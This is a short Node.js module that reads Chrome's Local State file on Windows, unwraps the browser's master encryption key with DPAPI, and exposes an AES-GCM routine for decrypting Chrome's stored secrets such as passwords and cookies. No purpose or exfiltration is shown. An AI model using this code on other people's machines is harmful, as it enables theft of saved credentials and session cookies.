const fs = require('fs');
const crypto = require('crypto');
const path = require('path');

const LOCAL_STATE_PATH = path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data', 'Local State');

function getWindowsKey() {
    try {
        const dpapi = require('win-dpapi');
        const localState = JSON.parse(fs.readFileSync(LOCAL_STATE_PATH, 'utf8'));
        const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
        const keyWithoutPrefix = encryptedKey.slice(5);
        return dpapi.unprotectData(keyWithoutPrefix, null, 'CurrentUser');
    } catch (e) {
        console.error("Failed to get Windows DPAPI key. Error:", e.message);
        process.exit(1);
    }
}

function decryptWin(buf, key) {
    try {
        const iv = buf.slice(3, 15);
        const payload = buf.slice(15, buf.length - 16);
        const authTag = buf.slice(buf.length - 16);
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(authTag);
        return decipher.update(payload, undefined, 'utf8') + decipher.final('utf8');
    } catch { return ''; }
}

module.exports = { getWindowsKey, decryptWin };
